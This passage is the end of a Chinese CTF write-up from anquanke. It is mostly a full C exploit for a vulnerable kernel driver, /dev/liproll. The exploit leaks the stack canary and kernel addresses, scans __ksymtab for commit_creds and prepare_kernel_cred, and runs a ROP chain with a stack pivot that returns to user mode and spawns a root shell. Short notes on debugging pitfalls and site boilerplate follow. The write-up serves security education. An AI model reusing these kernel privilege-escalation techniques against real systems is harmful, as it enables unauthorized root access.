+    #define CMD_CREATE 0xD3C7F03
+    #define CMD_CHOOSE 0xD3C7F04
+    #define CMD_RESET  0xD3C7F02
+    #define CMD_CAST   0xD3C7F01
+    
+    struct liproll
+    {
+        void *ptr;
+        uint32_t size;
+    };
+    
+    void die(const char *msg)
+    {
+        perror(msg);
+        exit(-1);
+    }
+    
+    uint64_t prepare_kernel_cred;
+    uint64_t commit_creds;
+    
+    uint64_t user_cs, user_ss, user_sp, user_rflags;
+    void save_status()
+    {
+        __asm(
+            "mov user_cs, cs;"
+            "mov user_ss, ss;"
+            "mov user_sp, rsp;"
+            "pushf;"
+            "pop user_rflags;"
+        );
+    
+        printf("[*] Status saved\n");
+    }
+    
+    void privilege_escalation()
+    {
+        void *(*pkc)(void *) = (void *)prepare_kernel_cred;
+        void *(*cc)(void *) = (void *)commit_creds;
+    
+        (*cc)((*pkc)(0));
+    }
+    
+    void getshell()
+    {
+        if(getuid() == 0)
+        {
+            printf("[!] Root!\n");
+            system("/bin/sh");
+        }
+        else
+        {
+            printf("[!] Failed!\n");
+        }
+    }
+    
+    void swapgs()
+    {
+        asm(
+            "swapgs;"
+            "iretq;"
+        );
+    }
+    
+    void sub_rsp()
+    {
+        asm(
+            "sub rsp, 0x128;"
+            "ret;"
+        );
+    }
+    
+    int main(void)
+    {
+        uint32_t idx = 0;
+        char buf[0x200] = {0};
+        int fd = open("/dev/liproll", O_RDWR);
+        if(fd < 0)
+            die("open error");
+    
+        // leak canary
+        ioctl(fd, CMD_CREATE);
+        ioctl(fd, CMD_CHOOSE, &idx);
+        read(fd, buf, 0x180);
+        uint64_t canary = *(uint64_t *)(buf + 0x100);
+        printf("[+] canary is: %p\n", canary);
+    
+        // overwrite global_buffer = 0xdeadbeef
+        // overwrite global_buffer size = 0x0
+        memset(buf, 0, 0x200);
+        *(uint64_t *)(buf + 0x100) = 0xdeadbeef;
+        *(uint32_t *)(buf + 0x108) = 0;
+        struct liproll tmp = 
+        {
+            .ptr = buf,
+            .size = 0x110
+        };
+        ioctl(fd, CMD_CAST, &tmp);
+    
+        // leak .data and .bss section
+        read(fd, buf, 0x200);
+        uint64_t _data_sec = ((*(uint64_t *)(buf + 0x18) >> 12) << 12) + 0x2000;
+        uint64_t _bss_sec = _data_sec + 0x4C0;
+        printf("[+] .data section address is: %p\n", _data_sec);
+        printf("[+] .bss section address is: %p\n", _bss_sec);
+    
+        // leak vmlinux_base
+        *(uint64_t *)(buf + 0x100) = _bss_sec + 0x80;
+        *(uint32_t *)(buf + 0x108) = 8;
+        tmp.ptr = buf;
+        tmp.size = 0x110;
+        ioctl(fd, CMD_CHOOSE, &idx);
+        ioctl(fd, CMD_CAST, &tmp);
+        read(fd, buf, 8);
+        uint64_t vmlinux_base = *(uint64_t *)buf;
+        printf("[+] vmlinux base is: %p\n", vmlinux_base);
+    
+        // overwrite vmlinux_base = 0 to bypass liproll_read check
+        *(uint64_t *)buf = 0;
+        write(fd, buf, 8);
+    
+        // find commit_creds and prepare_kernel_cred in __ksymtab
+        uint64_t __ksymtab_start = vmlinux_base + 0x12EE908;
+        printf("[+] __ksymtab_start address is: %p\n", __ksymtab_start);
+    
+        int i, j;
+        int found_commit_creds = 0, found_prepare_kernel_cred = 0;
+        int found_do_sync_core = 0, found_intel_pmu_save_and_restart = 0;
+        for(i = 0; i < 0x12000; i += 0xFC){
+            char accept_buf[0x100];
+            uint64_t base_addr = __ksymtab_start + i;
+    
+            *(uint64_t *)(buf + 0x100) = base_addr;
+            *(uint32_t *)(buf + 0x108) = 0xFC;
+            ioctl(fd, CMD_CHOOSE, &idx);
+            ioctl(fd, CMD_CAST, &tmp);
+            read(fd, accept_buf, 0xFC);
+    
+            for(j = 0; j < 0xFC; j += 0xC)
+            {
+                char name_buf[0x100];
+                uint32_t func_offset = *(uint32_t *)(accept_buf + j);
+                uint32_t name_offset = *(uint32_t *)(accept_buf + j + 4);
+                uint64_t func_addr = ((uint32_t)base_addr + func_offset + j) | (0xffffffffull << 32);
+                uint64_t name_addr = base_addr + name_offset + j + 4;
+    
+                *(uint64_t *)(buf + 0x100) = name_addr;
+                *(uint32_t *)(buf + 0x108) = 0x20;
+                ioctl(fd, CMD_CHOOSE, &idx);
+                ioctl(fd, CMD_CAST, &tmp);
+                read(fd, name_buf, 0x20);
+    
+                if(memcmp(name_buf, "commit_creds", 0xC) == 0)
+                {
+                    printf("[+] found commit_creds address is: %p\n", func_addr);
+                    found_commit_creds = 1;
+                    commit_creds = func_addr;
+                }
+                else if(memcmp(name_buf, "prepare_kernel_cred", 0x13) == 0)
+                {
+                    printf("[+] found prepare_kernel_cred address is: %p\n", func_addr);
+                    found_prepare_kernel_cred = 1;
+                    prepare_kernel_cred = func_addr;
+                }
+    
+                if(found_prepare_kernel_cred && found_commit_creds)
+                    break;
+            }
+        }
+    
+        save_status();
+    
+        // rop
+        *(uint64_t *)(buf + 0x110) = canary;
+        *(uint64_t *)(buf + 0x120) = &sub_rsp + 8; 
+        *(uint64_t *)(buf + 0x0) = &privilege_escalation; 
+        *(uint64_t *)(buf + 0x8) = &swapgs + 8;
+        *(uint64_t *)(buf + 0x10) = &getshell;
+        *(uint64_t *)(buf + 0x18) = user_cs;
+        *(uint64_t *)(buf + 0x20) = user_rflags;
+        *(uint64_t *)(buf + 0x28) = user_sp;
+        *(uint64_t *)(buf + 0x30) = user_ss;
+    
+        tmp.size = 0x128;
+        ioctl(fd, CMD_CHOOSE, &idx);
+        ioctl(fd, CMD_CAST, &tmp);
+    
+        return 0;
+    }
+    
+
+  7. 简单提一下自己踩的坑： 
+    * 打印栈上残留的数据的时候，发现实际运行和调试的时候，得到的数据是不一样的，这里卡了很久；后面直接就不挂调试，而是直接dump栈上的数据，然后找有用的地址。
+    * 最后写rop的时候，内核栈放不下最后会crash，所以做一个小小的栈迁移；不过既然任何gadgets都可以在用户程序中构造，也很方便。
+    * 因为gadget是封装在用户态程序的函数体中的，所以需要跳过函数头才能直接执行到gadget本身，否则会有`push rbp`的执行。
+
+本文翻译自 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **N0p** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/234263](/post/id/234263)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: []()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [CTF](/tag/CTF)
+
+ **+1** __3赞
+
+ __收藏
+
+![](https://p1.ssl.qhimg.com/t01ec7c9b5360104760.png) N0p
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
